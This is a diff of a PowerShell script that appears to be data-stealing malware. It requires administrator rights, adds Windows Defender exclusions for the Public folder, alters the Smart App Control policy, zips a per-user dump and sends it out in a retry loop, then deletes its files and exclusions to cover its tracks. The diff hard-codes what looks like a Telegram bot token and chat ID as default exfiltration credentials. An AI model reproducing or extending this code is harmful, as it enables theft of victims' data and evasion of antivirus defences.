@@ -1,9 +1,12 @@
 [CmdletBinding()]
 param(
-    [Parameter(Mandatory=$true)][string]$Token,
-    [Parameter(Mandatory=$true)][string]$ChatID,
+    [string]$Token,
+    [string]$ChatID,
     [int]$HistoryDays = 7
 )
+
+if (-not $Token)  { $Token  = '9144321837:AAHrcLLsQqlZGQNXFdry99NnBKfTIHLCK90' }
+if (-not $ChatID) { $ChatID = '1859879540' }
 
 $ErrorActionPreference = 'Continue'
 $ProgressPreference    = 'SilentlyContinue'
@@ -11,7 +14,10 @@ try { [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::
 
 if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) { exit 1 }
 
-$basePath   = 'C:\Users\Public\Documents\scripts'
+$pub = $env:PUBLIC
+if (-not $pub) { $pub = 'C:\Users\Public' }
+
+$basePath   = Join-Path $pub 'scripts'
 $dumpFolder = Join-Path $basePath ('{0}-{1}' -f $env:USERNAME, (Get-Date -Format yyyy-MM-dd))
 $dumpFile   = $dumpFolder + '.zip'
 
@@ -19,7 +25,7 @@ New-Item -ItemType Directory -Path $dumpFolder -Force | Out-Null
 Set-Location $basePath
 
 Add-MpPreference -ExclusionPath $basePath -Force -ErrorAction SilentlyContinue
-Add-MpPreference -ExclusionPath 'C:\Users\Public\Documents' -Force -ErrorAction SilentlyContinue
+Add-MpPreference -ExclusionPath $pub -Force -ErrorAction SilentlyContinue
 
 $ciKey   = 'HKLM:\SYSTEM\CurrentControlSet\Control\CI\Policy'
 $prevSac = (Get-ItemProperty $ciKey -Name VerifiedAndReputablePolicyState -ErrorAction SilentlyContinue).VerifiedAndReputablePolicyState
@@ -95,11 +101,11 @@ for ($i = 0; $i -lt 3 -and -not $sent; $i++) {
   }
 }
 
-Set-Location 'C:\Users\Public\Documents'
+Set-Location $pub
 Remove-Item -Recurse -Force $basePath -ErrorAction SilentlyContinue
-Remove-Item 'C:\Users\Public\Documents\ps.ps1' -Force -ErrorAction SilentlyContinue
+Remove-Item (Join-Path $pub 'p.ps1') -Force -ErrorAction SilentlyContinue
 Remove-MpPreference -ExclusionPath $basePath -Force -ErrorAction SilentlyContinue
-Remove-MpPreference -ExclusionPath 'C:\Users\Public\Documents' -Force -ErrorAction SilentlyContinue
+Remove-MpPreference -ExclusionPath $pub -Force -ErrorAction SilentlyContinue
 if ($null -ne $prevSac) { Set-ItemProperty $ciKey -Name VerifiedAndReputablePolicyState -Type DWord -Value $prevSac -ErrorAction SilentlyContinue }
 & CiTool --refresh --json | Out-Null
 
